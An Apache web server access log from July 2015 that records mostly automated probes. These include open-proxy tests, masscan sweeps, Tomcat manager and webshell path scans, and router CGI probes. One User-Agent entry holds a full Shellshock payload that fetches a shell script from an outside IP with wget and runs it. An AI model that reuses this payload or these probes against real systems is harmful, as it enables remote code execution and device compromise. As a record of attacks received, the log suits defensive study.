115.231.222.40 - - [15/Jul/2015:23:12:26 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7306986989424798 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
85.50.190.80 - - [15/Jul/2015:23:42:21 +0200] "GET / HTTP/1.1" 404 729 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3"
85.50.190.80 - - [15/Jul/2015:23:42:22 +0200] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 729 "-" "Safari/10600.6.3 CFNetwork/720.3.13 Darwin/14.3.0 (x86_64)"
85.50.190.80 - - [15/Jul/2015:23:42:22 +0200] "GET /apple-touch-icon.png HTTP/1.1" 200 11057 "-" "Safari/10600.6.3 CFNetwork/720.3.13 Darwin/14.3.0 (x86_64)"
85.50.190.80 - - [15/Jul/2015:23:42:22 +0200] "GET /favicon.ico HTTP/1.1" 200 6805 "http://cloud2k.sytes.net:8080/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3"
115.231.222.40 - - [16/Jul/2015:10:00:44 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3180281784618427 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
66.240.236.119 - - [16/Jul/2015:11:30:41 +0200] "GET / HTTP/1.1" 404 674 "-" "-"
66.240.236.119 - - [16/Jul/2015:11:30:42 +0200] "GET /robots.txt HTTP/1.1" 200 344 "-" "-"
66.240.236.119 - - [16/Jul/2015:11:30:42 +0200] "GET /sitemap.xml HTTP/1.1" 404 674 "-" "-"
115.231.222.40 - - [16/Jul/2015:12:41:23 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9416609888883016 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
61.240.144.65 - - [16/Jul/2015:12:45:30 +0200] "GET / HTTP/1.0" 404 740 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
115.239.228.8 - - [16/Jul/2015:15:17:21 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4493824703663555 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.231.222.40 - - [16/Jul/2015:15:26:29 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7609305245520316 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [16/Jul/2015:17:35:27 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.0496656257860490 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
1.34.22.39 - - [16/Jul/2015:18:13:05 +0200] "CONNECT smtp.mail.yahoo.com:25 HTTP/1.0" 404 740 "-" "-"
1.34.22.39 - - [16/Jul/2015:18:14:45 +0200] "CONNECT smtp.mail.yahoo.com:25 HTTP/1.0" 404 740 "-" "-"
192.187.110.98 - - [16/Jul/2015:20:59:42 +0200] "GET http://testp5.mielno.lubin.pl/testproxy.php HTTP/1.1" 404 674 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
115.231.222.40 - - [16/Jul/2015:21:00:31 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9989141604543893 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
184.95.52.218 - - [16/Jul/2015:21:09:15 +0200] "GET http://azenv.net/ HTTP/1.1" 404 674 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0"
115.239.228.8 - - [16/Jul/2015:22:18:23 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8385198747951731 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.231.222.40 - - [16/Jul/2015:23:54:25 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1687850796422280 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.231.222.40 - - [17/Jul/2015:08:40:13 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3055723447228044 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
119.42.102.173 - - [17/Jul/2015:08:54:31 +0200] "GET /Ringing.at.your.dorbell! HTTP/1.0" 404 740 "http://google.com/search?q=2+guys+1+horse" "x00_-gawa.sa.pilipinas.2015"
119.42.102.173 - - [17/Jul/2015:08:54:32 +0200] "GET / HTTP/1.0" 404 740 "-" "x00_-gawa.sa.pilipinas.2015"
119.42.102.173 - - [17/Jul/2015:08:54:33 +0200] "GET / HTTP/1.1" 404 729 "http://google.com/search?q=2+guys+1+horse" "x00_-gawa.sa.pilipinas.2015"
119.42.102.173 - - [17/Jul/2015:08:54:34 +0200] "GET /Diagnostics.asp HTTP/1.0" 404 740 "-" "x00_-gawa.sa.pilipinas.2015"
119.42.102.173 - - [17/Jul/2015:08:54:35 +0200] "GET / HTTP/1.0" 404 740 "-" "x00_-gawa.sa.pilipinas.2015"
119.42.102.173 - - [17/Jul/2015:08:54:35 +0200] "GET / HTTP/1.0" 404 740 "-" "x00_-gawa.sa.pilipinas.2015"
119.42.102.173 - - [17/Jul/2015:08:54:36 +0200] "GET / HTTP/1.0" 404 740 "-" "x00_-gawa.sa.pilipinas.2015"
115.231.222.40 - - [17/Jul/2015:11:22:07 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9689333625011861 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.231.222.40 - - [17/Jul/2015:13:54:10 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4566439316074251 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [17/Jul/2015:15:18:38 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7976501302798764 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.231.222.40 - - [17/Jul/2015:16:14:27 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8922320828331751 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.231.222.40 - - [17/Jul/2015:18:47:03 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8463001006873842 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [17/Jul/2015:20:20:00 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5102692111225011 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [17/Jul/2015:22:47:56 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1502216669050394 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.231.222.40 - - [17/Jul/2015:23:49:46 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4054106956158257 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
91.236.75.4 - - [18/Jul/2015:01:12:19 +0200] "GET http://www.google.com/reader/about/ HTTP/1.1" 404 674 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
115.239.228.8 - - [18/Jul/2015:01:17:01 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2819335950318658 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.231.222.40 - - [18/Jul/2015:02:19:42 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4272976332064034 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.231.222.40 - - [18/Jul/2015:04:40:03 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.0465828918313681 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
185.25.151.159 - - [18/Jul/2015:06:52:05 +0200] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 674 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
115.239.228.8 - - [18/Jul/2015:08:00:39 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6159872618538873 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.231.222.40 - - [18/Jul/2015:11:36:50 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5381427132012489 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
91.196.48.92 - - [18/Jul/2015:11:45:39 +0200] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 674 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
115.239.228.8 - - [18/Jul/2015:12:29:42 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2776137581295738 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
180.225.203.220 - - [18/Jul/2015:13:27:03 +0200] "GET /manager/html HTTP/1.1" 404 674 "-" "-"
115.231.222.40 - - [18/Jul/2015:14:05:24 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.0545464263681643 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [18/Jul/2015:14:41:47 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9820164554651217 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
91.196.48.92 - - [18/Jul/2015:15:39:30 +0200] "GET http://testp5.mielno.lubin.pl/testproxy.php HTTP/1.1" 404 674 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
115.231.222.40 - - [18/Jul/2015:16:44:42 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5827009474236180 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [18/Jul/2015:16:54:11 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7274649749462416 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.231.222.40 - - [18/Jul/2015:22:19:08 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4922550941433845 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [19/Jul/2015:12:47:12 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.0748656601675244 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
5.28.185.242 - - [19/Jul/2015:14:54:57 +0200] "GET / HTTP/1.0" 404 740 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
115.231.222.40 - - [19/Jul/2015:16:29:11 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9200973435960325 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
1.34.22.39 - - [19/Jul/2015:17:02:29 +0200] "CONNECT smtp.mail.yahoo.com:25 HTTP/1.0" 404 740 "-" "-"
115.231.222.40 - - [19/Jul/2015:19:11:11 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8429594003733584 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [19/Jul/2015:21:22:57 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4405649849848039 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.231.222.40 - - [19/Jul/2015:22:02:52 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9567118579573089 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
91.236.75.4 - - [19/Jul/2015:23:04:27 +0200] "GET http://www.google.com/reader/about/ HTTP/1.1" 404 674 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
185.49.14.190 - - [20/Jul/2015:00:56:18 +0200] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 674 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
223.220.243.125 - - [20/Jul/2015:00:59:08 +0200] "GET /zmeu/zmeu.jsp HTTP/1.0" 404 740 "-" "Wget/1.11.4 Red Hat modified"
223.220.243.125 - - [20/Jul/2015:00:59:09 +0200] "GET /iddqd/iddqd.jsp HTTP/1.0" 404 740 "-" "Wget/1.11.4 Red Hat modified"
223.220.243.125 - - [20/Jul/2015:00:59:09 +0200] "GET /iesvc/iesvc.jsp HTTP/1.0" 404 740 "-" "Wget/1.11.4 Red Hat modified"
223.220.243.125 - - [20/Jul/2015:00:59:10 +0200] "GET /wstats/wstats.jsp HTTP/1.0" 404 740 "-" "Wget/1.11.4 Red Hat modified"
223.220.243.125 - - [20/Jul/2015:00:59:11 +0200] "GET /zecmd/zecmd.jsp HTTP/1.0" 404 740 "-" "Wget/1.11.4 Red Hat modified"
223.220.243.125 - - [20/Jul/2015:00:59:12 +0200] "GET /idsvc/idsvc.jsp HTTP/1.0" 404 740 "-" "Wget/1.11.4 Red Hat modified"
223.220.243.125 - - [20/Jul/2015:00:59:12 +0200] "GET /wincfg/wincfg.jsp HTTP/1.0" 404 740 "-" "Wget/1.11.4 Red Hat modified"
192.187.110.98 - - [20/Jul/2015:06:30:32 +0200] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 674 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
104.192.0.226 - - [20/Jul/2015:07:40:26 +0200] "GET /cgi-bin/index.cgi HTTP/1.0" 404 740 "-" "-"
::1 - - [20/Jul/2015:08:04:14 +0200] "OPTIONS * HTTP/1.0" 200 112 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.9 (internal dummy connection)"
::1 - - [20/Jul/2015:08:04:14 +0200] "OPTIONS * HTTP/1.0" 200 112 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.9 (internal dummy connection)"
::1 - - [20/Jul/2015:08:04:14 +0200] "OPTIONS * HTTP/1.0" 200 112 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.9 (internal dummy connection)"
::1 - - [20/Jul/2015:08:04:14 +0200] "OPTIONS * HTTP/1.0" 200 112 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.9 (internal dummy connection)"
::1 - - [20/Jul/2015:08:04:14 +0200] "OPTIONS * HTTP/1.0" 200 112 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.9 (internal dummy connection)"
::1 - - [20/Jul/2015:08:04:14 +0200] "OPTIONS * HTTP/1.0" 200 112 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.9 (internal dummy connection)"
::1 - - [20/Jul/2015:08:04:14 +0200] "OPTIONS * HTTP/1.0" 200 112 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.9 (internal dummy connection)"
116.211.0.90 - - [20/Jul/2015:08:17:05 +0200] "GET http://ddns.oray.com/checkip HTTP/1.1" 400 0 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
116.211.0.90 - - [20/Jul/2015:08:17:06 +0200] "GET http://apps.game.qq.com/comm-htdocs/ip/get_ip.php HTTP/1.1" 400 0 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
115.231.222.40 - - [20/Jul/2015:09:02:12 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7420927194828031 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.231.222.40 - - [20/Jul/2015:11:48:09 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9180485801465908 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
46.117.225.186 - - [20/Jul/2015:12:36:36 +0200] "GET /tmUnblock.cgi HTTP/1.1" 400 0 "-" "-"
46.117.225.186 - - [20/Jul/2015:12:36:37 +0200] "GET / HTTP/1.1" 400 0 "-" "-"
115.239.228.8 - - [20/Jul/2015:12:53:50 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7506250120127266 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [20/Jul/2015:15:13:29 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5773238276157997 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [21/Jul/2015:00:30:00 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.0531471077438273 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [21/Jul/2015:09:44:54 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4090028574687105 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
205.200.3.183 - - [21/Jul/2015:11:27:00 +0200] "GET /tmUnblock.cgi HTTP/1.1" 400 0 "-" "-"
205.200.3.183 - - [21/Jul/2015:11:27:01 +0200] "GET / HTTP/1.1" 400 0 "-" "-"
115.239.228.8 - - [21/Jul/2015:12:07:19 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4528578918960578 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
178.117.105.81 - - [21/Jul/2015:17:09:49 +0200] "GET / HTTP/1.1" 404 729 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3"
178.117.105.81 - - [21/Jul/2015:17:09:49 +0200] "GET /favicon.ico HTTP/1.1" 200 6805 "http://cloud2k.sytes.net:8080/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3"
178.117.105.81 - - [21/Jul/2015:17:09:50 +0200] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 729 "-" "Safari/10600.6.3 CFNetwork/720.3.13 Darwin/14.3.0 (x86_64)"
178.117.105.81 - - [21/Jul/2015:17:09:50 +0200] "GET /apple-touch-icon.png HTTP/1.1" 200 11057 "-" "Safari/10600.6.3 CFNetwork/720.3.13 Darwin/14.3.0 (x86_64)"
115.239.228.8 - - [21/Jul/2015:19:06:38 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3328939743399940 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [21/Jul/2015:21:24:04 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5991007695915761 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [21/Jul/2015:23:44:58 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7991956846736144 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
91.196.48.92 - - [21/Jul/2015:23:56:50 +0200] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 674 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
115.231.222.40 - - [22/Jul/2015:11:14:03 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6771034921840044 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [22/Jul/2015:13:31:31 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9776718288710763 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [22/Jul/2015:15:46:26 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6106164788775298 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [22/Jul/2015:20:16:35 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2153536794142350 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
222.186.21.115 - "" [22/Jul/2015:22:16:41 +0200] "GET /manager/html HTTP/1.1" 404 674 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
60.18.150.34 - "" [22/Jul/2015:22:27:20 +0200] "GET /manager/html HTTP/1.1" 404 674 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
116.0.0.130 - - [22/Jul/2015:23:22:37 +0200] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 0 "-" "() { :; }; /bin/rm -rf /tmp/S0.sh && /bin/mkdir -p /share/HDB_DATA/.../php && /usr/bin/wget -c http://185.14.30.79/S0.sh -P /tmp && /bin/sh /tmp/S0.sh 0<&1 2>&1"
116.0.0.130 - - [22/Jul/2015:23:22:37 +0200] "  " 404 1145 "-" "-"
115.239.228.8 - - [23/Jul/2015:07:47:56 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1413580003816411 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [23/Jul/2015:12:20:24 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.0175100387963755 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [23/Jul/2015:14:37:31 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5523169336532581 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.231.222.40 - - [23/Jul/2015:15:03:20 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9313353260001670 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [23/Jul/2015:16:52:53 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7037136514213638 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
89.105.194.71 - - [23/Jul/2015:20:21:44 +0200] "CONNECT austin.ispgate.biz:443 HTTP/1.0" 404 740 "-" "-"
115.239.228.8 - - [23/Jul/2015:21:27:53 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7819444978156682 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [24/Jul/2015:06:44:53 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5264688908974142 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [24/Jul/2015:09:01:35 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7477145511038160 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [24/Jul/2015:13:34:07 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.0037691563226453 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
58.215.49.13 - "" [24/Jul/2015:19:16:41 +0200] "GET /manager/html HTTP/1.1" 404 674 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
115.231.222.40 - - [24/Jul/2015:20:56:42 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2179521784452674 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [25/Jul/2015:07:51:31 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2444986692226362 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [25/Jul/2015:12:22:33 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1352023770769619 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [25/Jul/2015:14:37:59 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2440285796898344 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [25/Jul/2015:16:53:01 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7647177627140681 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [25/Jul/2015:19:08:05 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5408172244457818 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.231.222.40 - - [25/Jul/2015:19:56:10 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.0623207134056962 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [25/Jul/2015:21:24:48 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3237594718318217 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [25/Jul/2015:23:43:08 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3158566941228450 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
5.28.185.242 - - [26/Jul/2015:00:01:24 +0200] "GET / HTTP/1.0" 404 740 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
